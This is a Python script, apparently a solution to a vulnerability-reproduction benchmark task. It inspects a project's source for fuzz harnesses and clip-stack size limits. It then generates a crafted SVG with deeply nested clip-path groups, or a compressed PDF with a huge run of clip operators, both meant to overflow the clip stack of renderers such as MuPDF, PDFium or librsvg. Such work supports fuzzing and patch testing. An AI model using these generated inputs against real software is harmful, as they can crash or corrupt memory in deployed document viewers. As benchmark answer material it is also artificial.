import os
import re
import tarfile
import zipfile
import zlib
from typing import Iterator, Tuple, Optional


class Solution:
    _MAX_TEXT_FILE = 2_000_000
    _MAX_FILES = 20000

    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            count = 0
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if count >= self._MAX_FILES:
                        return
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > self._MAX_TEXT_FILE:
                        continue
                    low = fn.lower()
                    if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or low in ('cmakelists.txt', 'makefile', 'configure.ac')):
                        continue
                    try:
                        with open(p, 'rb') as f:
                            data = f.read(self._MAX_TEXT_FILE + 1)
                        if len(data) > self._MAX_TEXT_FILE:
                            continue
                    except OSError:
                        continue
                    count += 1
                    yield p, data
            return

        lp = src_path.lower()
        if lp.endswith('.zip'):
            count = 0
            with zipfile.ZipFile(src_path, 'r') as zf:
                for zi in zf.infolist():
                    if count >= self._MAX_FILES:
                        return
                    if zi.is_dir():
                        continue
                    if zi.file_size <= 0 or zi.file_size > self._MAX_TEXT_FILE:
                        continue
                    name = zi.filename
                    low = name.lower()
                    base = os.path.basename(low)
                    if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or base in ('cmakelists.txt', 'makefile', 'configure.ac')):
                        continue
                    try:
                        data = zf.read(zi)
                    except Exception:
                        continue
                    if len(data) > self._MAX_TEXT_FILE:
                        continue
                    count += 1
                    yield name, data
            return

        count = 0
        with tarfile.open(src_path, 'r:*') as tf:
            for m in tf:
                if count >= self._MAX_FILES:
                    return
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > self._MAX_TEXT_FILE:
                    continue
                name = m.name
                low = name.lower()
                base = os.path.basename(low)
                if not (low.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hh', '.hpp', '.hxx', '.m', '.mm', '.rs', '.go', '.java', '.py', '.js', '.ts', '.txt', '.md', '.cmake', '.in', '.yml', '.yaml')) or base in ('cmakelists.txt', 'makefile', 'configure.ac')):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(self._MAX_TEXT_FILE + 1)
                    f.close()
                except Exception:
                    continue
                if len(data) > self._MAX_TEXT_FILE:
                    continue
                count += 1
                yield name, data

    def _analyze_source(self, src_path: str) -> Tuple[str, Optional[int]]:
        harness_texts = []
        pdf_score = 0
        svg_score = 0
        skia_score = 0

        max_stack_const = None
        stack_candidate_regexes = [
            re.compile(r'(?i)\bclip\w*stack\w*\s*\[\s*(\d{1,7})\s*\]'),
            re.compile(r'(?i)\blayer\w*clip\w*stack\w*\s*\[\s*(\d{1,7})\s*\]'),
            re.compile(r'(?i)std::array\s*<[^>]+,\s*(\d{1,7})\s*>\s*[^;{]*\bclip\w*stack\b'),
            re.compile(r'(?i)#define\s+\w*(?:LAYER|CLIP)\w*STACK\w*\s+(\d{1,7})\b'),
            re.compile(r'(?i)\b(?:const|static)\s+(?:int|unsigned|size_t)\s+\w*(?:Layer|Clip)\w*Stack\w*\s*=\s*(\d{1,7})\b'),
            re.compile(r'(?i)\b(?:MAX|kMax)\w*(?:Layer|Clip)\w*(?:Stack|Depth)\w*\s*=?\s*(\d{1,7})\b'),
        ]

        for _, data in self._iter_source_files(src_path):
            try:
                text = data.decode('utf-8', errors='ignore')
            except Exception:
                continue
            low = text.lower()

            if 'llvmfuzzertestoneinput' in low or 'fuzzertestoneinput' in low:
                harness_texts.append(low)

            if 'mupdf' in low or 'fitz' in low or 'fz_' in low or 'pdfium' in low or 'poppler' in low or 'mupdf/' in low:
                pdf_score += 3
            if 'pdf' in low:
                pdf_score += 1

            if 'librsvg' in low or 'rsvg_' in low or 'rsvghandle' in low or 'rsvg_handle' in low:
                svg_score += 5
            if 'nanosvg' in low or 'svg.h' in low or 'svgparse' in low or 'clip-path' in low or 'clippath' in low:
                svg_score += 2
            if 'svg' in low:
                svg_score += 1

            if 'skia' in low or 'skpicture' in low or 'skcanvas' in low:
                skia_score += 2
            if '.skp' in low or 'skp' in low:
                skia_score += 1

            if ('clip' in low and 'stack' in low) or ('layer/clip' in low) or ('layer' in low and 'clip' in low and 'stack' in low):
                for rgx in stack_candidate_regexes:
                    for m in rgx.findall(text):
                        try:
                            v = int(m)
                        except Exception:
                            continue
                        if v <= 0 or v > 2_000_000:
                            continue
                        if max_stack_const is None or v > max_stack_const:
                            max_stack_const = v

        kind = 'svg'
        for h in harness_texts:
            if ('fz_open_document' in h) or ('fz_new_context' in h) or ('mupdf' in h) or ('pdfium' in h) or ('poppler' in h) or ('pdf' in h and 'document' in h):
                kind = 'pdf'
                break
            if ('rsvg_handle' in h) or ('librsvg' in h) or ('svg' in h and 'handle' in h):
                kind = 'svg'
                break

        if not harness_texts:
            if pdf_score > svg_score * 2 and pdf_score >= 8:
                kind = 'pdf'
            elif svg_score >= pdf_score and svg_score >= 6:
                kind = 'svg'
            elif skia_score > max(pdf_score, svg_score) and skia_score >= 8:
                kind = 'skia'
            else:
                kind = 'svg'

        return kind, max_stack_const

    def _gen_svg(self, depth: int) -> bytes:
        if depth < 1:
            depth = 1
        if depth > 200000:
            depth = 200000

        header = (
            b'<svg xmlns="http://www.w3.org/2000/svg">'
            b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
        )
        open_tag = b'<g clip-path="url(#c)">'
        close_tag = b'</g>'
        inner = b'<rect width="1" height="1"/>'
        footer = b'</svg>'

        return header + (open_tag * depth) + inner + (close_tag * depth) + footer

    def _build_pdf(self, compressed_stream: bytes) -> bytes:
        parts = []
        offsets = [0]

        def add_obj(obj_num: int, body: bytes) -> None:
            offsets.append(sum(len(p) for p in parts))
            parts.append(str(obj_num).encode('ascii') + b' 0 obj\n' + body + b'\nendobj\n')

        add_obj(1, b'<< /Type /Catalog /Pages 2 0 R >>')
        add_obj(2, b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
        add_obj(3, b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << >> /Contents 4 0 R >>')

        stream_dict = (
            b'<< /Length ' + str(len(compressed_stream)).encode('ascii') +
            b' /Filter /FlateDecode >>\nstream\n'
        )
        stream_body = stream_dict + compressed_stream + b'\nendstream'
        add_obj(4, stream_body)

        header = b'%PDF-1.4\n%\xE2\xE3\xCF\xD3\n'
        body = b''.join(parts)
        xref_start = len(header) + len(body)

        xref = [b'xref\n0 5\n']
        xref.append(b'0000000000 65535 f \n')
        for i in range(1, 5):
            off = len(header) + offsets[i]
            xref.append(f'{off:010d} 00000 n \n'.encode('ascii'))
        xref_bytes = b''.join(xref)

        trailer = (
            b'trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n' +
            str(xref_start).encode('ascii') +
            b'\n%%EOF\n'
        )

        return header + body + xref_bytes + trailer

    def _gen_pdf(self, depth: int) -> bytes:
        if depth < 1:
            depth = 1
        if depth > 2_000_000:
            depth = 2_000_000

        pattern = b'0 0 1 1 re W n '
        content = b'q ' + (pattern * depth) + b'n'
        compressed = zlib.compress(content, 9)
        return self._build_pdf(compressed)

    def solve(self, src_path: str) -> bytes:
        kind, inferred = self._analyze_source(src_path)

        if kind == 'pdf':
            base = 60000
            depth = base
            if inferred is not None:
                depth = max(depth, inferred + 64)
            return self._gen_pdf(depth)

        if kind == 'skia':
            # Fallback to SVG-like clip nesting; many Skia fuzzers accept SVG through SVG module,
            # but if not, this still yields a large structured input.
            base = 35000
            depth = base
            if inferred is not None:
                depth = max(depth, inferred + 64)
            return self._gen_svg(depth)

        base = 35000
        depth = base
        if inferred is not None:
            depth = max(depth, inferred + 64)
        return self._gen_svg(depth)